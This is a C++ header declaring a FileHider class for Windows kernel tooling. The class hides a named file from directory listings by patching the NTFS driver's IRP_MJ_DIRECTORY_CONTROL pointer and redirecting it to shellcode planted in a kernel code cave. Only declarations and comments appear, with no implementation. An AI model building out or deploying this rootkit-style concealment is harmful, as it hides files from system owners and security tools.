/**
 * @file FileHider.h
 * @author Gregory King
 * @date August 14, 2025
 * @brief This file contains the declaration of the FileHider class.
 *
 * The FileHider class provides functionality for hiding a file from directory
 * listings by hooking the filesystem driver's IRP_MJ_DIRECTORY_CONTROL.
 */

#pragma once

#include "Providers/IProvider.h"
#include <string>
#include <memory>
#include <vector>

namespace KernelMode {
    /**
     * @class FileHider
     * @brief Manages file hiding operations via kernel hooking.
     *
     * This class uses a provider to patch the MajorFunction table of a
     * filesystem driver, redirecting directory enumerations to a custom
     * shellcode filter to hide a specified file.
     */
    class FileHider {
    public:
        /**
         * @brief Constructs a FileHider with a given provider.
         * @param provider A shared pointer to an active IProvider for kernel memory operations.
         */
        explicit FileHider(std::shared_ptr<Providers::IProvider> provider);
        ~FileHider();

        /**
         * @brief Hides a file by hooking the NTFS driver.
         * @param fileName The name of the file to hide (e.g., "secret.txt").
         * @return True if the hook was successfully placed, false otherwise.
         */
        bool HideFile(const std::wstring& fileName);

        /**
         * @brief Restores the original function pointer, unhiding the file.
         * @return True if the hook was successfully removed, false otherwise.
         */
        bool UnhideFile();

    private:
        // Structure passed to our shellcode
        struct HOOK_PARAMS {
            uintptr_t OriginalFunction;
            wchar_t FileNameToHide[256];
        };

        /**
         * @brief Finds the DRIVER_OBJECT for a given driver name.
         * @param driverName The name of the driver (e.g., L"\\FileSystem\\Ntfs").
         * @return The kernel address of the DRIVER_OBJECT, or 0 on failure.
         */
        uintptr_t FindDriverObject(const std::wstring& driverName);

        /**
         * @brief Finds an executable "code cave" in a kernel module to host our shellcode.
         * @param moduleBase The base address of the module to search.
         * @param caveSize The required size of the code cave.
         * @return The address of a suitable code cave, or 0 if not found.
         */
        uintptr_t FindCodeCave(uintptr_t moduleBase, size_t caveSize);

        std::shared_ptr<Providers::IProvider> provider;
        uintptr_t ntfsDriverObject;
        uintptr_t originalDirectoryControl;
        uintptr_t hookAddress; // Address of the entire hook (shellcode + params)
    };
}